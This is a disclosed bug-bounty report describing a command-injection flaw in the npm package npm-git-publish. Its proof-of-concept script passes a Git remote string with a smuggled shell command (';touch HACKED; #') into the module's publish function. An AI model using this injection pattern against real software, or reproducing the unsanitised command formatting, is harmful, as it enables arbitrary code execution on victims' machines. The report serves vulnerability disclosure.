# [npm-git-publish] RCE via insecure command formatting

## Report Details
- **Report ID**: 730121
- **URL**: https://hackerone.com/reports/730121
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-05T21:31:12.464Z
- **Disclosed**: 2020-01-11T12:08:21.335Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `npm-git-publish` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `npm-git-publish`
**version:** `0.2.4-beta`
**npm page:** `https://www.npmjs.com/package/npm-git-publish`

## Module Description
> Share/publish private packages using Git remotes!

## Module Stats
[~70] downloads in the last day
[268] downloads in the last week
[~1k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/theoy/npm-git-publish/blob/master/lib/publish.ts#L151

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var git = require('npm-git-publish');
git.publish('.', 'http://gihub.com ;touch HACKED; #')

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i npm-git-publish # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F626780}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `npm-git-publish`

## Attachments
- Screenshot_from_2019-11-05_22-27-27.png
